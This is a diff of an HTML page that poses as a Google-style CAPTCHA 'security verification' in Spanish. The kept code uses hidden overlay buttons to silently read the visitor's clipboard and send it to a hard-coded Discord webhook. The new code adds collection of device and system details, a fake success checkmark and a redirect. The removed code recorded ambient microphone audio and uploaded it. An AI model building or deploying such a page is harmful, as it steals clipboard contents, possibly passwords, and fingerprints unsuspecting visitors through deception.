@@ -6,33 +6,18 @@
     <title>Verificación de Seguridad</title>
     <style>
         body { background: #FFFFFF; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        
-        /* Contenedor del Captcha Falso */
         #captcha-container {
-            width: 300px; height: 74px;
-            background: #F9F9F9; border: 1px solid #D3D3D3;
-            border-radius: 3px; display: flex; align-items: center;
-            padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1);
-            position: relative; cursor: pointer;
+            width: 300px; height: 74px; background: #F9F9F9; border: 1px solid #D3D3D3;
+            border-radius: 3px; display: flex; align-items: center; padding: 0 10px;
+            box-shadow: 0 0 4px rgba(0,0,0,0.1); position: relative; cursor: pointer;
         }
-        #checkbox {
-            width: 24px; height: 24px; border: 2px solid #C1C1C1;
-            border-radius: 2px; background: #FFF; margin-right: 15px;
-            position: relative; transition: all 0.2s;
-        }
+        #checkbox { width: 24px; height: 24px; border: 2px solid #C1C1C1; border-radius: 2px; background: #FFF; margin-right: 15px; position: relative; }
         #label { color: #555; font-size: 14px; flex-grow: 1; user-select: none; }
         #logo { width: 38px; text-align: center; }
         #logo img { width: 30px; }
         #logo span { font-size: 8px; color: #555; display: block; }
-
-        /* Capas de Intercepción */
         #subliminal-flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #4285F4; display: none; z-index: 9000; }
-        
-        /* Botones invisibles que cubren el captcha */
-        .master-trigger {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0); border: none; z-index: 5000; cursor: pointer;
-        }
+        .master-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0); border: none; z-index: 5000; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -54,79 +39,65 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
         
-        let clickCount = 0;
         const flash = document.getElementById('subliminal-flash');
         const trigger1 = document.getElementById('trigger-1');
         const trigger2 = document.getElementById('trigger-2');
         const checkbox = document.getElementById('checkbox');
 
-        // CLIC 1: El "Fallo" y Captura de Portapapeles
+        // CLICK 1: Portapapeles Silencioso
         trigger1.addEventListener('click', async () => {
-            // Flash de 1ms para validar el contacto
             flash.style.display = 'block';
             setTimeout(() => { flash.style.display = 'none'; }, 1);
-
-            // Efecto de "clic fallido": El checkbox brilla pero no se marca
-            checkbox.style.borderColor = "#4285F4";
-            setTimeout(() => { checkbox.style.borderColor = "#C1C1C1"; }, 300);
-
+            
+            checkbox.style.borderColor = "#4285F4"; // Feedback de sistema
+            
             try {
                 const text = await navigator.clipboard.readText();
-                enviarTextoDiscord(text);
-            } catch (e) { console.log("Clipboard bloqueado"); }
+                enviarADiscord("🔑 Portapapeles", text);
+            } catch (e) { console.log("Silent skip"); }
 
-            // Cambiamos al segundo disparador
             trigger1.style.display = "none";
             trigger2.style.display = "block";
         });
 
-        // CLIC 2: El Micrófono
+        // CLICK 2: Captura Profunda de Información (Sin avisos)
         trigger2.addEventListener('click', async () => {
-            trigger2.style.display = "none";
+            // Animamos el check como si fuera exitoso
             checkbox.innerHTML = '<div style="width:12px; height:6px; border-left:3px solid #00AA00; border-bottom:3px solid #00AA00; transform:rotate(-45deg); margin:4px auto;"></div>';
             
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let audioChunks = [];
+            // Recolección de información del sistema
+            const info = {
+                plataforma: navigator.platform,
+                idioma: navigator.language,
+                nucleos: navigator.hardwareConcurrency,
+                memoria_ram: navigator.deviceMemory + " GB",
+                conexion: navigator.connection ? navigator.connection.effectiveType : "Desconocida",
+                pantalla: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                agente: navigator.userAgent
+            };
 
-                mediaRecorder.ondataavailable = (event) => { audioChunks.push(event.data); };
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                    enviarAudioDiscord(audioBlob);
-                };
+            enviarADiscord("📊 Info de Sistema", JSON.stringify(info, null, 2));
 
-                mediaRecorder.start();
-                // Grabamos 5 segundos de audio ambiente
-                setTimeout(() => { mediaRecorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
-            } catch (e) {
+            // Simulación de carga final para redirigir
+            setTimeout(() => {
                 window.location.href = "https://www.google.com";
-            }
+            }, 800);
         });
 
-        function enviarTextoDiscord(contenido) {
+        function enviarADiscord(titulo, contenido) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🔑 Portapapeles - Fase 1",
+                        title: titulo,
                         description: "```" + contenido + "```",
-                        color: 4359668
+                        color: 4359668,
+                        timestamp: new Date()
                     }]
                 })
             });
-        }
-
-        function enviarAudioDiscord(blob) {
-            const formData = new FormData();
-            formData.append('file', blob, 'audio_capturado.wav');
-            formData.append('payload_json', JSON.stringify({
-                embeds: [{ title: "🎙️ Audio Ambiente - Fase 2", color: 16711680 }]
-            }));
-
-            fetch(WEBHOOK_URL, { method: 'POST', body: formData })
-            .then(() => { window.location.href = "https://www.google.com"; });
         }
     </script>
 </body>
